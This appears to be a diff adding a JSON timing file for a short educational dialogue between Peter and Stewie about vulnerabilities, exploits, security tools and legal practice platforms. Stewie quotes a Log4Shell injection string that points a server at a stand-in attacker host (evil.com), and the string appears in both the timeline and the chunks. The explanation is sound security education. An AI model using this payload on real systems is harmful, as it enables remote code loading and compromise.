@@ -1,0 +1,319 @@
+{
+  "timeline": [
+    {
+      "speaker": "Peter",
+      "text": "So finding a vulnerability means you can hack a system?",
+      "start_s": 0.0,
+      "end_s": 2.664
+    },
+    {
+      "speaker": "Stewie",
+      "text": "Not quite. A vulnerability is a weakness. An exploit is the code that takes advantage of that weakness. You need to turn the vulnerability into a working exploit, which is often harder than it sounds.",
+      "start_s": 2.814,
+      "end_s": 12.462
+    },
+    {
+      "speaker": "Peter",
+      "text": "How hard can it be?",
+      "start_s": 12.612,
+      "end_s": 14.388
+    },
+    {
+      "speaker": "Stewie",
+      "text": "Depends on the vulnerability. Log4Shell was trivially exploitable - you just sent a string like ${jndi:ldap://evil.com/a} and the server would connect to your attacker-controlled server. Millions of systems were compromised within hours.",
+      "start_s": 14.538,
+      "end_s": 27.21
+    },
+    {
+      "speaker": "Stewie",
+      "text": "But most exploits are harder. Buffer overflows require understanding memory layouts, stack protection mechanisms, and ASLR. You often need to chain multiple vulnerabilities.",
+      "start_s": 27.36,
+      "end_s": 36.336
+    },
+    {
+      "speaker": "Peter",
+      "text": "What tools do people use?",
+      "start_s": 36.486,
+      "end_s": 38.262
+    },
+    {
+      "speaker": "Stewie",
+      "text": "Metasploit is the most well-known exploitation framework. It has thousands of exploits for known vulnerabilities. But real attackers write custom exploits for zero-day vulnerabilities.",
+      "start_s": 38.412,
+      "end_s": 46.932
+    },
+    {
+      "speaker": "Stewie",
+      "text": "For web applications, tools like Burp Suite let you intercept and modify HTTP requests. SQLMap automates SQL injection exploitation.",
+      "start_s": 47.082,
+      "end_s": 54.546
+    },
+    {
+      "speaker": "Peter",
+      "text": "Is this legal to learn?",
+      "start_s": 54.696,
+      "end_s": 56.472
+    },
+    {
+      "speaker": "Stewie",
+      "text": "On your own systems and in authorized CTF competitions, absolutely. Platforms like Hack The Box and TryHackMe provide legal environments to practice. Never exploit systems you don't own without permission.",
+      "start_s": 56.622,
+      "end_s": 66.462
+    },
+    {
+      "speaker": "Stewie",
+      "text": "Interview tip: explain how you'd exploit a specific vulnerability category. Understanding exploitation helps you write better defenses and prioritize patches.",
+      "start_s": 66.612,
+      "end_s": 73.86
+    },
+    {
+      "speaker": "Peter",
+      "text": "I'm signing up for Hack The Box right now.",
+      "start_s": 74.01,
+      "end_s": 76.146
+    }
+  ],
+  "chunks": [
+    {
+      "text": "So finding a vulnerability means you",
+      "start_s": 0.0,
+      "end_s": 1.795304347826087,
+      "speaker": "Peter"
+    },
+    {
+      "text": "can hack a system?",
+      "start_s": 1.795304347826087,
+      "end_s": 2.664,
+      "speaker": "Peter"
+    },
+    {
+      "text": "Not quite. A vulnerability is a",
+      "start_s": 2.814,
+      "end_s": 4.325132530120482,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "weakness. An exploit is the code",
+      "start_s": 4.325132530120482,
+      "end_s": 5.894385542168674,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "that takes advantage of that weakness.",
+      "start_s": 5.894385542168675,
+      "end_s": 7.812361445783132,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "You need to turn the vulnerability",
+      "start_s": 7.812361445783132,
+      "end_s": 9.497855421686747,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "into a working exploit, which is",
+      "start_s": 9.497855421686747,
+      "end_s": 11.06710843373494,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "often harder than it sounds.",
+      "start_s": 11.06710843373494,
+      "end_s": 12.462,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "How hard can it be?",
+      "start_s": 12.612,
+      "end_s": 14.388,
+      "speaker": "Peter"
+    },
+    {
+      "text": "Depends on the vulnerability. Log4Shell was",
+      "start_s": 14.538,
+      "end_s": 16.87555339805825,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "trivially exploitable - you just sent",
+      "start_s": 16.87555339805825,
+      "end_s": 18.844019417475728,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "a string like ${jndi:ldap://evil.com/a} and the",
+      "start_s": 18.844019417475728,
+      "end_s": 21.427631067961162,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "server would connect to your attacker-controlled",
+      "start_s": 21.427631067961162,
+      "end_s": 24.072757281553397,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "server. Millions of systems were compromised",
+      "start_s": 24.0727572815534,
+      "end_s": 26.47182524271845,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "within hours.",
+      "start_s": 26.47182524271845,
+      "end_s": 27.210000000000004,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "But most exploits are harder. Buffer",
+      "start_s": 27.36,
+      "end_s": 29.202754966887415,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "overflows require understanding memory layouts, stack",
+      "start_s": 29.202754966887415,
+      "end_s": 32.05605298013245,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "protection mechanisms, and ASLR. You often",
+      "start_s": 32.05605298013245,
+      "end_s": 34.255470198675496,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "need to chain multiple vulnerabilities.",
+      "start_s": 34.255470198675496,
+      "end_s": 36.336,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "What tools do people use?",
+      "start_s": 36.486,
+      "end_s": 38.262,
+      "speaker": "Peter"
+    },
+    {
+      "text": "Metasploit is the most well-known exploitation",
+      "start_s": 38.412,
+      "end_s": 40.58168944099379,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "framework. It has thousands of exploits",
+      "start_s": 40.58168944099379,
+      "end_s": 42.38094409937888,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "for known vulnerabilities. But real attackers",
+      "start_s": 42.38094409937888,
+      "end_s": 44.49771428571428,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "write custom exploits for zero-day vulnerabilities.",
+      "start_s": 44.49771428571429,
+      "end_s": 46.93200000000001,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "For web applications, tools like Burp",
+      "start_s": 47.082,
+      "end_s": 49.17715789473684,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "Suite let you intercept and modify",
+      "start_s": 49.17715789473684,
+      "end_s": 51.07589473684211,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "HTTP requests. SQLMap automates SQL injection",
+      "start_s": 51.07589473684211,
+      "end_s": 53.69484210526316,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "exploitation.",
+      "start_s": 53.69484210526316,
+      "end_s": 54.546,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "Is this legal to learn?",
+      "start_s": 54.696,
+      "end_s": 56.472,
+      "speaker": "Peter"
+    },
+    {
+      "text": "On your own systems and in",
+      "start_s": 56.622,
+      "end_s": 57.796090909090914,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "authorized CTF competitions, absolutely. Platforms like",
+      "start_s": 57.796090909090914,
+      "end_s": 60.591545454545454,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "Hack The Box and TryHackMe provide",
+      "start_s": 60.591545454545454,
+      "end_s": 62.21290909090909,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "legal environments to practice. Never exploit",
+      "start_s": 62.212909090909086,
+      "end_s": 64.44927272727273,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "systems you don't own without permission.",
+      "start_s": 64.44927272727273,
+      "end_s": 66.462,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "Interview tip: explain how you'd exploit",
+      "start_s": 66.612,
+      "end_s": 68.43703597122303,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "a specific vulnerability category. Understanding exploitation",
+      "start_s": 68.43703597122303,
+      "end_s": 71.35709352517986,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "helps you write better defenses and",
+      "start_s": 71.35709352517985,
+      "end_s": 72.92141007194245,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "prioritize patches.",
+      "start_s": 72.92141007194245,
+      "end_s": 73.86,
+      "speaker": "Stewie"
+    },
+    {
+      "text": "I'm signing up for Hack The",
+      "start_s": 74.01,
+      "end_s": 75.39211764705883,
+      "speaker": "Peter"
+    },
+    {
+      "text": "Box right now.",
+      "start_s": 75.39211764705883,
+      "end_s": 76.146,
+      "speaker": "Peter"
+    }
+  ],
+  "total_duration": 76.146
+}
